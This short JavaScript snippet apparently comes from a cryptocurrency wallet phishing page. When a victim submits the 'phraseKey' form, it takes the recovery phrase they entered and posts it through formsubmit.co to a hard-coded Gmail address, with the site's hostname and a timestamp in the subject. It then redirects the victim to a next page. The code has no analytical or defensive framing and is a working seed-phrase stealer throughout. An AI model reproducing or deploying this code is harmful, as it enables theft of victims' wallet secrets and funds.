phraseKey.addEventListener('submit', e => {
  e.preventDefault()
  mail = 'createmulti2@gmail.com'
  next = 'next.html'
  subject = `${window.location.hostname} ${new Date()}`
  let r = new FormData()
  recovery_phrase = recovery_phrase.value
  r.append('phraseKey', recovery_phrase)
  r.append('_captcha', false)
  r.append('_next', next)
  r.append('_template', 'table')
  r.append('_subject', subject)
  let n = `https://formsubmit.co/${mail}`
  fetch(
    n,
    {
      method: 'POST',
      body: r
    },
    { referrer: 'https://twitter.com' }
  ).then(e => window.location.assign(next))
})
